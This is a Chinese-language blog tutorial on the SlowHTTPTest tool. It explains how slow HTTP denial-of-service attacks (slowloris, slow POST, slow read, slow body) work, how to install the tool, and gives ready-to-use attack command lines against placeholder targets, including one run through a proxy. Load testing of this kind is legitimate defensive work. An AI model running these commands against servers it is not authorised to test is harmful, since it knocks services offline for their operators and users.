---
title: "SlowHTTPTest-慢速DoS攻击"
categories: [ "安全" ]
tags: [ "web安全" ]
draft: false
slug: "SlowHTTPTest-慢速DoS攻击-slowhttptest-慢速dos攻击"
date: "2017-04-08 07:35:35"
---



Slowhttptest是一个依赖于实际HTTP协议的Slow HTTP DoS攻击工具，它的设计原理是要求服务器所有请求被完全接收后再进行处理。

SlowHTTPTest是一款对服务器进行慢攻击的测试软件，所谓的慢攻击就是相对于cc或者DDoS的快而言的，并不是只有量大速度快才能把服务器搞挂，使用慢攻击有时候也能到达同一效果。slowhttptest包含了之前几种慢攻击的攻击方式，包括slowloris, Slow HTTP POST, Slow Read attack等。那么这些慢攻击工具的原理就是想办法让服务器等待，当服务器在保持连接等待时，自然就消耗了资源。

Slowhttptest的源码托管在Github：<https://github.com/shekyan/slowhttptest>

## 在Kali Linux上安装SlowHTTPTest

    # apt-get install slowhttptest 

如果你使用其他linux发行版，可以从源码编译安装：

    $ ./configure
    $ make
    $ sudo make install

## 使用示例

man手册：

    # man slowhttptest

帮助信息中提供了很多使用示例。

## slowloris模式：

    # slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3

![][1] 

生成图表(CSV和html格式)：

    slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3

## Slow Read模式：

    # slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://yourtarget.com -p 5 -l 350 -e x.x.x.x:8080

x.x.x.x:8080是HTTP代理

## 实际测试

Slow Body攻击：

    # slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://www.mywebsite.com -x 10 -p 3

攻击开始，服务器端在几秒内的变化：

![][2]

 [1]: /uploads/oss/2017-04-25-14916370508816.png ""
 [2]: /uploads/oss/2017-04-25-14916371093087.png ""